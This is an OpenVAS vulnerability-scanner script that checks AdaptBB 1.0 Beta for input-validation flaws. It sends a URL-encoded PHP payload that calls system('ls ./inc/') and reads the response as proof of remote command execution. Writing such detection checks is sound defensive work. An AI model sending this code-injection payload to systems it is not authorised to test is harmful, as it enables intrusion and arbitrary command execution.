###############################################################################
# OpenVAS Vulnerability Test
# $Id: adaptbb_34452.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# AdaptBB Multiple Input Validation Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:adaptbb:adaptbb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100128");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
  script_bugtraq_id(34452);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_name("AdaptBB Multiple Input Validation Vulnerabilities");

  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");

  script_dependencies("adaptbb_detect.nasl");
  script_mandatory_keys("adaptbb/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"AdaptBB is prone to multiple security vulnerabilities because it fails to
  adequately sanitize user-supplied input. These vulnerabilities include multiple SQL-injection issues, an
  arbitrary-file-upload issue, and an arbitrary-command-execution issue.");

  script_tag(name:"impact", value:"Exploiting these issues can allow an attacker to upload and execute arbitrary
  files, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying
  database. Other attacks may also be possible.");

  script_tag(name:"affected", value:"AdaptBB 1.0 Beta is vulnerable. Other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34452");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?do=profile&user=blabla&box=%3C?php%20echo%20%22%3Cpre%3E%22;%20system(%22ls%20./inc/%22);%20echo%20%22%3C/pre%3E%22;?%3E";

if (http_vuln_check(port: port, url: url, pattern: "dbinfo.php", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);